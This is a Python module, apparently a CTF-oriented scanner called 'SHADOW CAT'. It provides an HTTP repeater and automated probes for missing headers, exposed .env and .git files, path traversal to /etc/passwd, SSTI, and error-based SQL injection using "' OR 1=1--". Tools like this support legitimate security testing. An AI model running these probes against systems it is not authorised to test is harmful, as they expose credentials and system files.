"""
SHADOW CAT — Burp Suite-Grade Repeater & Active Vulnerability Scanner
Provides in-app HTTP Repeater for arbitrary request manipulation and
automated vulnerability scanning (LFI, SSTI, SQLi errors, sensitive files, security headers).
"""

import time
import re
import urllib.parse
from typing import Dict, List, Any, Optional
import httpx

FLAG_REGEX = re.compile(r'(?:flag|ctf|picoctf|htb|thcon|seccon|defcon)\{[a-zA-Z0-9_\-\.\!@#\$\%^&*+=]+\}', re.IGNORECASE)

# Shared high-performance HTTP Connection Pool
_SHARED_CLIENT: Optional[httpx.AsyncClient] = None

def get_shared_client() -> httpx.AsyncClient:
    """Returns or initializes the singleton AsyncClient with connection pooling."""
    global _SHARED_CLIENT
    if _SHARED_CLIENT is None or _SHARED_CLIENT.is_closed:
        limits = httpx.Limits(max_keepalive_connections=30, max_connections=100, keepalive_expiry=30.0)
        _SHARED_CLIENT = httpx.AsyncClient(
            verify=False,
            limits=limits,
            timeout=15.0
        )
    return _SHARED_CLIENT

async def burp_repeater_send(
    url: str,
    method: str = "GET",
    headers: Optional[Dict[str, str]] = None,
    cookies: Optional[Dict[str, str]] = None,
    body: Optional[str] = None,
    follow_redirects: bool = True,
    timeout: float = 12.0
) -> Dict[str, Any]:
    """Sends arbitrary HTTP request and returns comprehensive response telemetry using pooled HTTP connections."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    clean_headers = headers or {}
    clean_cookies = cookies or {}
    method_upper = method.upper()

    t0 = time.time()
    try:
        client = get_shared_client()
        resp = await client.request(
            method=method_upper,
            url=url,
            headers=clean_headers,
            cookies=clean_cookies,
            content=body.encode("utf-8") if body else None,
            follow_redirects=follow_redirects,
            timeout=timeout
        )

        latency_ms = round((time.time() - t0) * 1000, 2)
        resp_body = resp.text
        flags_found = FLAG_REGEX.findall(resp_body)

        return {
            "status_code": resp.status_code,
            "status_text": resp.reason_phrase,
            "latency_ms": latency_ms,
            "size_bytes": len(resp.content),
            "headers": dict(resp.headers),
            "body": resp_body[:50000],  # 50KB preview
            "body_truncated": len(resp_body) > 50000,
            "flags_found": list(set(flags_found))
        }
    except Exception as e:
        latency_ms = round((time.time() - t0) * 1000, 2)
        return {
            "error": str(e),
            "latency_ms": latency_ms,
            "status_code": 0,
            "status_text": "Connection Error",
            "headers": {},
            "body": "",
            "flags_found": []
        }

async def scan_target_vulnerabilities(base_url: str) -> Dict[str, Any]:
    """
    Automated Burp-style active vulnerability assessment:
    - Path Traversal (LFI)
    - SSTI (Server-Side Template Injection)
    - SQL Error-based detection
    - Sensitive File Exposure (.env, .git/HEAD)
    - Missing Security Headers
    """
    if not base_url.startswith(("http://", "https://")):
        base_url = "http://" + base_url

    parsed = urllib.parse.urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    findings: List[Dict[str, Any]] = []
    probes_run = 0
    client = get_shared_client()

    # 1. Base URL & Security Headers Check
    try:
        r = await client.get(base_url, timeout=8.0)
        probes_run += 1
        headers = {k.lower(): v for k, v in r.headers.items()}
        
        missing_sec_headers = []
        if "content-security-policy" not in headers:
            missing_sec_headers.append("Content-Security-Policy (CSP)")
        if "x-frame-options" not in headers:
            missing_sec_headers.append("X-Frame-Options (Clickjacking Risk)")
        if "x-content-type-options" not in headers:
            missing_sec_headers.append("X-Content-Type-Options (MIME Sniffing Risk)")
        if "strict-transport-security" not in headers and parsed.scheme == "https":
            missing_sec_headers.append("Strict-Transport-Security (HSTS)")

        if missing_sec_headers:
            findings.append({
                "title": "Missing HTTP Security Headers",
                "severity": "LOW",
                "category": "Configuration",
                "description": f"Target is missing critical security defensive headers: {', '.join(missing_sec_headers)}",
                "evidence": f"Headers checked on {base_url}"
            })

        # Check CORS wildcard
        if headers.get("access-control-allow-origin") == "*":
            findings.append({
                "title": "Permissive CORS Wildcard",
                "severity": "MEDIUM",
                "category": "CORS",
                "description": "Access-Control-Allow-Origin is set to '*' allowing arbitrary cross-origin script access.",
                "evidence": "Access-Control-Allow-Origin: *"
            })
    except Exception:
        pass

    # 2. Sensitive Files Exposure (.git, .env, robots.txt, etc.)
    sensitive_paths = [
        ("/.git/HEAD", ["ref: refs/"], "CRITICAL", "Exposed .git Repository (Full source code extraction possible)"),
        ("/.env", ["DB_PASSWORD", "SECRET_KEY", "API_KEY", "DATABASE_URL", "FLAG=", "APP_KEY"], "CRITICAL", "Exposed .env Configuration File (Database & API credentials leaked)"),
        ("/robots.txt", ["Disallow:", "User-agent:"], "INFO", "Robots.txt Crawl Directives Found"),
        ("/.DS_Store", ["\x00\x00\x00\x01Bud1"], "MEDIUM", "Exposed macOS .DS_Store Metadata File"),
        ("/phpinfo.php", ["PHP Version", "Configuration File (php.ini) Path"], "HIGH", "Exposed PHPInfo Configuration Page"),
    ]

    for path, sig_list, severity, desc in sensitive_paths:
        try:
            test_url = origin + path
            r = await client.get(test_url)
            probes_run += 1
            matched_sig = next((s for s in sig_list if s in r.text), None)
            if r.status_code == 200 and matched_sig:
                flags = FLAG_REGEX.findall(r.text)
                findings.append({
                    "title": f"Exposed Sensitive File: {path}",
                    "severity": severity,
                    "category": "Information Disclosure",
                    "description": desc,
                    "evidence": f"HTTP 200 with signature match '{matched_sig}' at {test_url}",
                    "url": test_url,
                    "flags_found": list(set(flags))
                })
        except Exception:
            pass

    # 3. Path Traversal / LFI Probe
    lfi_payloads = [
        "../../../../../../../../etc/passwd",
        "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "/etc/passwd"
    ]
    for lfi in lfi_payloads:
        try:
            test_url = f"{base_url}?file={lfi}&page={lfi}&path={lfi}"
            r = await client.get(test_url)
            probes_run += 1
            if "root:x:0:0:" in r.text or "bin/bash" in r.text or "flag{" in r.text.lower():
                flags = FLAG_REGEX.findall(r.text)
                findings.append({
                    "title": "Local File Inclusion (LFI) / Path Traversal",
                    "severity": "CRITICAL",
                    "category": "LFI",
                    "description": "Server responded with /etc/passwd contents or leaked file when supplied with directory traversal sequences.",
                    "evidence": "Found 'root:x:0:0:' pattern or file content in response body",
                    "url": test_url,
                    "flags_found": list(set(flags))
                })
                break
        except Exception:
            pass

    # 4. SSTI (Server-Side Template Injection) Probe
    ssti_payload = "{{7777*7}}"  # 54439
    try:
        test_url = f"{base_url}?name={ssti_payload}&q={ssti_payload}"
        r = await client.get(test_url)
        probes_run += 1
        if "54439" in r.text and ssti_payload not in r.text:
            flags = FLAG_REGEX.findall(r.text)
            findings.append({
                "title": "Server-Side Template Injection (SSTI)",
                "severity": "CRITICAL",
                "category": "SSTI",
                "description": "Template expression {{7777*7}} was mathematically evaluated to 54439 on the server.",
                "evidence": "Mathematical result '54439' reflected in HTML output",
                "url": test_url,
                "flags_found": list(set(flags))
            })
    except Exception:
        pass

    # 5. SQL Error-Based Fingerprint Probe
    sqli_probe = "' OR 1=1--"
    sql_errors = [
        (r"you have an error in your sql syntax", "MySQL / MariaDB"),
        (r"unclosed quotation mark after the character string", "Microsoft SQL Server"),
        (r"pg_query\(\): query failed:", "PostgreSQL"),
        (r"sqlite3::query\(\):", "SQLite"),
        (r"ora-[0-9]{5}", "Oracle Database")
    ]
    try:
        test_url = f"{base_url}?id={urllib.parse.quote(sqli_probe)}"
        r = await client.get(test_url)
        probes_run += 1
        for err_regex, db_name in sql_errors:
            if re.search(err_regex, r.text, re.IGNORECASE):
                flags = FLAG_REGEX.findall(r.text)
                findings.append({
                    "title": f"SQL Error-Based Injection ({db_name})",
                    "severity": "HIGH",
                    "category": "SQLi",
                    "description": f"Server revealed raw database error messages when single quote was injected.",
                    "evidence": f"Matched pattern '{err_regex}' ({db_name})",
                    "url": test_url,
                    "flags_found": list(set(flags))
                })
                break
    except Exception:
        pass

    return {
        "target_url": base_url,
        "probes_run": probes_run,
        "total_findings": len(findings),
        "findings": findings
    }
